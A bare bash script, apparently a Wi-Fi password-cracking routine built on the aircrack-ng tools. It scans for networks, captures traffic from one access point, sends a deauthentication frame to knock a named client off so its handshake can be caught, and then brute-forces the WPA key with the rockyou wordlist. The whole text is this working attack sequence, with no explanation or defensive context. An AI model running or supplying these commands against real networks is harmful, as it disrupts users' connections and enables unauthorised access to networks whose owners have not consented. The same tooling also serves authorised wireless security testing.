#!/bin/bash
airodump-ng wlan0
airodump-ng -c 1 --bssid 6C:72:20:12:6F:C8 -w PSKcrack wlan0
aireplay-ng -0 1 -a 6C:72:20:12:6F:C8 -c 48:02:2A:1C:E1:0F wlan0
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 6C:72:20:12:6F:C8 PSKcrack.cap
